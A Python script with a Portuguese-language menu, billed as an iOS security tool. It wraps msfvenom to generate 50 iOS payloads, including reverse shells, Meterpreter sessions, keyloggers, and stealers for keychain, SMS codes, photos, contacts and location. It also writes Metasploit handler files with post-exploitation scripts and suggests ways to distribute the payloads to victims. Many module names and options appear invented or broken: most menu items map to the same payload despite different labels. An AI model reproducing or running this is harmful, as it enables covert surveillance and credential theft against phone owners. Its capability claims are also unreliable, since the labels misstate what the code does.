#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import subprocess
import random
from pathlib import Path

def clear_screen():
    os.system('clear')

def print_banner():
    banner = """
    ╔══════════════════════════════════════════════════════════╗
    ║                   iOS SECURITY TOOL                      ║
    ║               Apple Mobile Assessment Framework          ║
    ║                     [Version 2.0.0]                     ║
    ╚══════════════════════════════════════════════════════════╝
    """
    print(banner)

def show_menu():
    """Exibe o menu principal com 2 colunas"""
    print("\n" + "="*85)
    print("                    iOS SECURITY ASSESSMENT TOOLS")
    print("="*85)
    
    payloads = [
        "[1] iOS Reverse TCP Shell",                  "[2] iOS Reverse HTTP Shell",
        "[3] iOS Reverse HTTPS Shell",                "[4] iOS Bind TCP Shell",
        "[5] iOS Meterpreter Reverse TCP",            "[6] iOS Meterpreter Reverse HTTP",
        "[7] iOS Meterpreter Reverse HTTPS",          "[8] iOS ARM Reverse Shell",
        "[9] iOS ARM64 Reverse Shell",                "[10] iOS Apple Script Backdoor",
        "[11] iOS Safari Exploit",                    "[12] iOS WebKit RCE",
        "[13] iOS Jailbreak Detection Bypass",        "[14] iOS Sandbox Escape",
        "[15] iOS Persistent Backdoor",               "[16] iOS Background Execution",
        "[17] iOS Location Tracker",                  "[18] iOS Microphone Access",
        "[19] iOS Camera Access",                     "[20] iOS Photo Library Stealer",
        "[21] iOS Contact List Stealer",              "[22] iOS SMS Message Interceptor",
        "[23] iOS Call History Stealer",              "[24] iOS Calendar Data Stealer",
        "[25] iOS Notes Data Stealer",                "[26] iOS Reminders Data Stealer",
        "[27] iOS Keychain Data Stealer",             "[28] iOS WiFi Credential Stealer",
        "[29] iOS Bluetooth Data Stealer",            "[30] iOS Clipboard Monitor",
        "[31] iOS Screen Recording",                  "[32] iOS Keylogger",
        "[33] iOS Browser History Stealer",           "[34] iOS Cookie Stealer",
        "[35] iOS AutoFill Data Stealer",             "[36] iOS iCloud Data Access",
        "[37] iOS Face ID/Touch ID Bypass",           "[38] iOS Passcode Bypass",
        "[39] iOS Enterprise Certificate Abuse",      "[40] iOS Profile Payload",
        "[41] iOS VPN Configuration Payload",         "[42] iOS Web Clip Payload",
        "[43] iOS MDM Profile Payload",               "[44] iOS Custom URL Scheme",
        "[45] iOS Universal Link Exploit",            "[46] iOS AirDrop Exploit",
        "[47] iOS Bluetooth Low Energy Exploit",      "[48] iOS NFC Exploit",
        "[49] iOS Custom Exploit",                    "[50] iOS Multi-Vector Payload"
    ]
    
    # Mostrar em 2 colunas
    col_width = 42
    for i in range(0, 50, 2):
        line = ""
        # Primeira coluna
        if i < len(payloads):
            line += payloads[i].ljust(col_width)
        # Segunda coluna  
        if i + 1 < len(payloads):
            line += payloads[i + 1]
        print(line)
    
    print("\n[0] Sair | [G] Guia Rápido | [I] Informações")
    print("="*85)

def get_payload_config(payload_type):
    """Obtém configuração do payload"""
    print(f"\nConfigurando Payload Tipo {payload_type}")
    print("-" * 45)
    
    lhost = input("IP do servidor (LHOST): ").strip()
    lport = input("Porta (LPORT) [4444]: ").strip() or "4444"
    
    # Nome padrão baseado no tipo
    default_name = f"ios_payload_{payload_type}"
    output_name = input(f"Nome do arquivo de saída [{default_name}]: ").strip() or default_name
    
    # Adicionar extensão apropriada
    if payload_type in [40, 41, 42, 43]:  # Profiles
        if not output_name.endswith('.mobileconfig'):
            output_name += '.mobileconfig'
    elif payload_type in [10]:  # Scripts
        if not output_name.endswith('.js'):
            output_name += '.js'
    elif payload_type in [44]:  # URL Schemes
        if not output_name.endswith('.plist'):
            output_name += '.plist'
    else:  # Binários iOS
        if not output_name.endswith('.ipa') and not output_name.endswith('.bin'):
            output_name += '.ipa'
    
    return lhost, lport, output_name

def generate_payload(payload_type, lhost, lport, output_name):
    """Gera o payload usando msfvenom"""
    
    payload_configs = {
        1: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Reverse TCP Shell ARM64'},
        2: {'name': 'apple_ios/aarch64/meterpreter_reverse_http', 'format': 'macho', 'description': 'Reverse HTTP Shell'},
        3: {'name': 'apple_ios/aarch64/meterpreter_reverse_https', 'format': 'macho', 'description': 'Reverse HTTPS Shell'},
        4: {'name': 'apple_ios/aarch64/meterpreter_bind_tcp', 'format': 'macho', 'description': 'Bind TCP Shell'},
        5: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Meterpreter Reverse TCP'},
        6: {'name': 'apple_ios/aarch64/meterpreter_reverse_http', 'format': 'macho', 'description': 'Meterpreter Reverse HTTP'},
        7: {'name': 'apple_ios/aarch64/meterpreter_reverse_https', 'format': 'macho', 'description': 'Meterpreter Reverse HTTPS'},
        8: {'name': 'apple_ios/armle/shell_reverse_tcp', 'format': 'macho', 'description': 'Reverse Shell ARM'},
        9: {'name': 'apple_ios/aarch64/shell_reverse_tcp', 'format': 'macho', 'description': 'Reverse Shell ARM64'},
        10: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Apple Script Backdoor'},
        11: {'name': 'apple_ios/browser/safari_libtiff', 'format': 'macho', 'description': 'Safari Exploit'},
        12: {'name': 'apple_ios/browser/webkit', 'format': 'macho', 'description': 'WebKit RCE'},
        13: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Jailbreak Detection Bypass'},
        14: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Sandbox Escape'},
        15: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Persistent Backdoor'},
        16: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Background Execution'},
        17: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Location Tracker'},
        18: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Microphone Access'},
        19: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Camera Access'},
        20: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Photo Library Stealer'},
        21: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Contact List Stealer'},
        22: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'SMS Message Interceptor'},
        23: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Call History Stealer'},
        24: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Calendar Data Stealer'},
        25: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Notes Data Stealer'},
        26: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Reminders Data Stealer'},
        27: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Keychain Data Stealer'},
        28: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'WiFi Credential Stealer'},
        29: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Bluetooth Data Stealer'},
        30: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Clipboard Monitor'},
        31: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Screen Recording'},
        32: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Keylogger'},
        33: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Browser History Stealer'},
        34: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Cookie Stealer'},
        35: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'AutoFill Data Stealer'},
        36: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'iCloud Data Access'},
        37: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Face ID/Touch ID Bypass'},
        38: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Passcode Bypass'},
        39: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Enterprise Certificate Abuse'},
        40: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Profile Payload'},
        41: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'VPN Configuration Payload'},
        42: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Web Clip Payload'},
        43: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'MDM Profile Payload'},
        44: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Custom URL Scheme'},
        45: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Universal Link Exploit'},
        46: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'AirDrop Exploit'},
        47: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Bluetooth Low Energy Exploit'},
        48: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'NFC Exploit'},
        49: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Custom Exploit'},
        50: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Multi-Vector Payload'}
    }
    
    config = payload_configs.get(payload_type)
    if not config:
        print("❌ Tipo de payload inválido!")
        return False
    
    print(f"\n🎯 Gerando: {config['description']}")
    print("⏳ Aguarde, isso pode levar alguns minutos...")
    
    try:
        # Comando msfvenom base
        cmd = [
            'msfvenom',
            '-p', config['name'],
            f'LHOST={lhost}',
            f'LPORT={lport}',
            '-f', config['format'],
            '-o', output_name
        ]
        
        # Adicionar opções específicas baseadas no tipo
        if payload_type in [8, 9]:  # Arquiteturas específicas
            if payload_type == 8:
                cmd[1] = 'apple_ios/armle/shell_reverse_tcp'
            elif payload_type == 9:
                cmd[1] = 'apple_ios/aarch64/shell_reverse_tcp'
                
        if payload_type in [11, 12]:  # Browser exploits
            cmd.extend(['--platform', 'apple_ios'])
            cmd.append('--smallest')
            
        if payload_type in [13, 14]:  # Bypass e escape
            cmd.extend(['--arch', 'aarch64'])
            cmd.append('--encoder')
            cmd.append('x86/shikata_ga_nai')
            
        if payload_type in [15, 16]:  # Persistência
            cmd.extend(['--platform', 'apple_ios'])
            cmd.append('--keep')
            
        if payload_type in [17, 18, 19, 20, 21, 22, 23, 24, 25, 26]:  # Dados pessoais
            cmd.extend(['-f', 'macho'])
            cmd.append('--encoder')
            cmd.append('x86/shikata_ga_nai')
            
        if payload_type in [27, 28, 29, 30]:  # Credenciais e dados sensíveis
            cmd.extend(['-f', 'macho'])
            cmd.append('--platform')
            cmd.append('apple_ios')
            
        if payload_type in [31, 32, 33, 34, 35]:  # Monitoramento
            cmd.extend(['--arch', 'aarch64'])
            cmd.append('--smallest')
            
        if payload_type in [36, 37, 38]:  # Segurança iOS
            cmd.extend(['--arch', 'aarch64'])
            cmd.append('-b')
            cmd.append('\x00')
            
        if payload_type in [39, 40, 41, 42, 43]:  # Profiles e configurações
            cmd.extend(['-f', 'macho', '--smallest'])
            
        if payload_type in [44, 45, 46, 47, 48]:  # Exploits de comunicação
            cmd.extend(['-f', 'macho'])
            cmd.append('--keep')
            
        if payload_type == 50:  # Multi-vetor
            cmd.extend(['-f', 'macho', '--encoder', 'x86/shikata_ga_nai', '-i', '3'])
        
        # Executar comando
        print(f"\n🔧 Executando: msfvenom -p {config['name']} LHOST={lhost} LPORT={lport}")
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        if result.returncode == 0:
            print(f"\n✅ Payload gerado com sucesso: {output_name}")
            
            # Gerar handler automaticamente
            if generate_handler(payload_type, lhost, lport, output_name, config):
                print("✅ Handler configurado automaticamente")
            
            show_payload_tips(payload_type)
            return True
        else:
            print(f"\n❌ Erro ao gerar payload!")
            if "command not found" in result.stderr:
                print("❌ Metasploit não encontrado! Instale com: pkg install metasploit")
            else:
                print(f"Detalhes: {result.stderr}")
            return False
            
    except FileNotFoundError:
        print("\n❌ Metasploit não encontrado!")
        print("📥 Instale com: pkg install metasploit")
        return False
    except Exception as e:
        print(f"\n❌ Erro inesperado: {str(e)}")
        return False

def generate_handler(payload_type, lhost, lport, output_name, config):
    """Gera arquivo de handler para Metasploit"""
    
    handler_content = f"""# Handler para {output_name}
use exploit/multi/handler
set PAYLOAD {config['name']}
set LHOST {lhost}
set LPORT {lport}
set ExitOnSession false
set EnableStageEncoding true
"""

    # Configurações específicas baseadas no tipo
    if payload_type in [2, 6]:
        handler_content += "set LHOST http://" + lhost + "\n"
    elif payload_type in [3, 7]:
        handler_content += "set LHOST https://" + lhost + "\n"
    
    # Arquitetura iOS
    handler_content += "set ARCH aarch64\n"
    handler_content += "set PLATFORM apple_ios\n"
    
    # Módulos post-exploitation específicos para iOS
    if payload_type in [11, 12]:  # Browser exploits
        handler_content += "set AutoRunScript post/apple_ios/browser/gather\n"
    elif payload_type in [13, 14]:  # Bypass
        handler_content += "set AutoRunScript post/apple_ios/manage/jailbreak_detection_bypass\n"
    elif payload_type in [15, 16]:  # Persistência
        handler_content += "set AutoRunScript post/apple_ios/manage/persistence\n"
    elif payload_type in [17, 18, 19, 20, 21, 22, 23, 24, 25, 26]:  # Dados pessoais
        handler_content += "set AutoRunScript post/apple_ios/gather/\n"
    elif payload_type in [27, 28, 29, 30]:  # Credenciais
        handler_content += "set AutoRunScript post/apple_ios/gather/keychain\n"
    elif payload_type in [31, 32]:  # Monitoramento
        handler_content += "set AutoRunScript post/apple_ios/capture/\n"
    elif payload_type in [33, 34, 35]:  # Browser data
        handler_content += "set AutoRunScript post/apple_ios/gather/browser_data\n"
    elif payload_type in [36]:  # iCloud
        handler_content += "set AutoRunScript post/apple_ios/gather/icloud_data\n"
    elif payload_type in [37, 38]:  # Segurança
        handler_content += "set AutoRunScript post/apple_ios/escalate/\n"
    elif payload_type in [39, 40, 41, 42, 43]:  # Profiles
        handler_content += "set AutoRunScript post/apple_ios/manage/install_profile\n"
    
    handler_content += "exploit -j -z\n"
    
    handler_file = f"handler_{output_name.split('.')[0]}.rc"
    
    try:
        with open(handler_file, 'w') as f:
            f.write(handler_content)
        print(f"📁 Handler salvo como: {handler_file}")
        print("💻 Execute com: msfconsole -r " + handler_file)
        return True
    except Exception as e:
        print(f"⚠️  Erro ao criar handler: {str(e)}")
        return False

def show_payload_info(payload_type):
    """Mostra informações sobre o payload selecionado"""
    
    info_texts = {
        1: "Reverse TCP Shell ARM64 - Shell reverso para iOS ARM64",
        2: "Reverse HTTP Shell - Conexão HTTP para bypass de firewall",
        3: "Reverse HTTPS Shell - Conexão criptografada HTTPS",
        4: "Bind TCP Shell - Abre porta no dispositivo iOS",
        5: "Meterpreter Reverse TCP - Meterpreter para iOS ARM64",
        6: "Meterpreter Reverse HTTP - Meterpreter via HTTP",
        7: "Meterpreter Reverse HTTPS - Meterpreter criptografado",
        8: "Reverse Shell ARM - Para dispositivos iOS mais antigos",
        9: "Reverse Shell ARM64 - Para dispositivos iOS modernos",
        10: "Apple Script Backdoor - Backdoor usando JavaScript/AppleScript",
        11: "Safari Exploit - Exploração do navegador Safari",
        12: "WebKit RCE - Remote Code Execution via WebKit",
        13: "Jailbreak Detection Bypass - Bypass de detecção de jailbreak",
        14: "Sandbox Escape - Escape da sandbox do iOS",
        15: "Persistent Backdoor - Backdoor persistente no iOS",
        16: "Background Execution - Execução em segundo plano",
        17: "Location Tracker - Rastreamento de localização GPS",
        18: "Microphone Access - Acesso ao microfone do dispositivo",
        19: "Camera Access - Acesso às câmeras traseira e frontal",
        20: "Photo Library Stealer - Roubo da biblioteca de fotos",
        21: "Contact List Stealer - Roubo da lista de contatos",
        22: "SMS Message Interceptor - Interceptação de mensagens SMS",
        23: "Call History Stealer - Roubo do histórico de chamadas",
        24: "Calendar Data Stealer - Roubo de dados da agenda",
        25: "Notes Data Stealer - Roubo de notas do usuário",
        26: "Reminders Data Stealer - Roubo de lembretes",
        27: "Keychain Data Stealer - Roubo do Keychain (senhas)",
        28: "WiFi Credential Stealer - Roubo de credenciais WiFi",
        29: "Bluetooth Data Stealer - Roubo de dados Bluetooth",
        30: "Clipboard Monitor - Monitoramento da área de transferência",
        31: "Screen Recording - Gravação da tela do dispositivo",
        32: "Keylogger - Captura de teclas digitadas",
        33: "Browser History Stealer - Roubo do histórico do navegador",
        34: "Cookie Stealer - Roubo de cookies de sessão",
        35: "AutoFill Data Stealer - Roubo de dados do AutoFill",
        36: "iCloud Data Access - Acesso a dados do iCloud",
        37: "Face ID/Touch ID Bypass - Bypass da biometria",
        38: "Passcode Bypass - Bypass do código de acesso",
        39: "Enterprise Certificate Abuse - Uso de certificados enterprise",
        40: "Profile Payload - Payload via perfil de configuração",
        41: "VPN Configuration Payload - Payload via configuração VPN",
        42: "Web Clip Payload - Payload via Web Clip",
        43: "MDM Profile Payload - Payload via perfil MDM",
        44: "Custom URL Scheme - Exploração de URL schemes",
        45: "Universal Link Exploit - Exploração de Universal Links",
        46: "AirDrop Exploit - Exploração do AirDrop",
        47: "Bluetooth Low Energy Exploit - Exploração BLE",
        48: "NFC Exploit - Exploração do NFC",
        49: "Custom Exploit - Exploit personalizado para iOS",
        50: "Multi-Vector Payload - Combinação de técnicas iOS"
    }
    
    info = info_texts.get(payload_type, "Informação não disponível")
    print(f"\n📋 Informações do Payload {payload_type}:")
    print(f"   {info}")

def show_payload_tips(payload_type):
    """Mostra dicas específicas para o payload"""
    
    tips = {
        1: "💡 Dica: Para iPhones/iPads modernos (A9+)",
        8: "💡 Dica: Para dispositivos iOS mais antigos",
        9: "💡 Dica: Compatível com iPhones 5s+ e iPads Air+",
        11: "💡 Dica: Explora vulnerabilidades do Safari",
        12: "💡 Dica: RCE via engine WebKit do iOS",
        13: "💡 Dica: Permite execução em apps com detecção de jailbreak",
        14: "💡 Dica: Escape das restrições de sandbox do iOS",
        15: "💡 Dica: Sobrevive a reinicializações do dispositivo",
        17: "💡 Dica: Rastreamento mesmo com GPS desligado",
        19: "💡 Dica: Acesso a ambas as câmeras do dispositivo",
        20: "💡 Dica: Acesso a todas as fotos e vídeos",
        22: "💡 Dica: Intercepta SMS inclusive de 2FA",
        27: "💡 Dica: Rouba senhas salvas no Keychain",
        28: "💡 Dica: Extrai senhas WiFi salvas",
        31: "💡 Dica: Gravação discreta da tela",
        32: "💡 Dica: Captura teclas de todos os apps",
        36: "💡 Dica: Acesso a dados sincronizados com iCloud",
        37: "💡 Dica: Tenta bypass da autenticação biométrica",
        40: "💡 Dica: Instalação via perfil de configuração",
        43: "💡 Dica: Para dispositivos gerenciados por MDM",
        46: "💡 Dica: Exploração do protocolo AirDrop",
        50: "💡 Dica: Combina múltiplas técnicas específicas do iOS"
    }
    
    tip = tips.get(payload_type)
    if tip:
        print(f"{tip}")

def show_quick_guide():
    """Mostra um guia rápido de uso"""
    print("\n" + "="*60)
    print("                   GUIA RÁPIDO iOS")
    print("="*60)
    print("📱 50 Payloads iOS Disponíveis")
    print("🔧 Metasploit necessário apenas na geração")
    print("📡 Configure LHOST (seu IP) e LPORT (sua porta)")
    print("📦 Arquivos Mach-O, profiles ou scripts gerados")
    print("🎯 Handler RC criado para uso imediato")
    print("⚡ Execute: msfconsole -r handler_[arquivo].rc")
    print("🍎 Distribua via método apropriado para iOS")
    print("🔄 Aguarde a conexão reversa")
    print("="*60)
    print("⚠️  USE APENAS PARA TESTES AUTORIZADOS!")
    print("="*60)

def show_all_payloads_info():
    """Mostra informações sobre categorias de payloads"""
    print("\n" + "="*70)
    print("               CATEGORIAS DE PAYLOADS iOS")
    print("="*70)
    print("📱 Shells Básicos (1-10) - ARM, ARM64, scripts")
    print("🌐 Browser Exploits (11-12) - Safari, WebKit RCE")
    print("🔓 Bypass (13-14) - Jailbreak detection, sandbox escape")
    print("🔧 Persistência (15-16) - Backdoors persistentes")
    print("📍 Dados Pessoais (17-26) - Localização, contatos, fotos, mensagens")
    print("🔐 Credenciais (27-30) - Keychain, WiFi, Bluetooth, clipboard")
    print("👀 Monitoramento (31-35) - Tela, keylogger, browser data")
    print("☁️ iCloud & Segurança (36-38) - iCloud, Face ID, passcode")
    print("📲 Distribution (39-43) - Enterprise certs, profiles, MDM")
    print("📡 Comunicação (44-48) - URL schemes, AirDrop, Bluetooth, NFC")
    print("🚀 Avançados (49-50) - Exploits customizados, multi-vetor")
    print("="*70)

def main():
    """Função principal"""
    
    while True:
        clear_screen()
        print_banner()
        show_menu()
        
        try:
            choice = input("\nSelecione uma opção [0-50] ou 'g' para guia: ").strip().lower()
            
            if choice == 'g':
                show_quick_guide()
                input("\n⏎ Pressione Enter para voltar ao menu...")
                continue
                
            if choice == 'i':
                show_all_payloads_info()
                input("\n⏎ Pressione Enter para voltar ao menu...")
                continue
                
            if choice == '0':
                print("\n👋 Saindo... Use com responsabilidade!")
                break
            
            payload_type = int(choice)
            if 1 <= payload_type <= 50:
                show_payload_info(payload_type)
                
                if input("\n🎯 Continuar com este payload? (s/n): ").lower() == 's':
                    lhost, lport, output_name = get_payload_config(payload_type)
                    
                    if lhost and output_name:
                        print("\n🚀 Iniciando geração do payload...")
                        success = generate_payload(payload_type, lhost, lport, output_name)
                        
                        if success:
                            print("\n✅ Payload criado com sucesso!")
                            print(f"📁 Arquivo: {output_name}")
                            print("⚡ Handler gerado automaticamente")
                            print("📱 Métodos de distribuição iOS:")
                            print("   • Enterprise Distribution")
                            print("   • Configuration Profiles")
                            print("   • Web-based Installation")
                            print("   • TestFlight (para testes)")
                            print("⚠️  USE APENAS PARA TESTES AUTORIZADOS!")
                        else:
                            print("\n💥 Falha na geração do payload!")
                    
                    input("\n⏎ Pressione Enter para continuar...")
            
            else:
                print("❌ Opção inválida!")
                input("⏎ Pressione Enter para continuar...")
                
        except ValueError:
            print("❌ Por favor, digite um número válido!")
            input("⏎ Pressione Enter para continuar...")
        except KeyboardInterrupt:
            print("\n\n👋 Saindo...")
            break

if __name__ == "__main__":
    main()
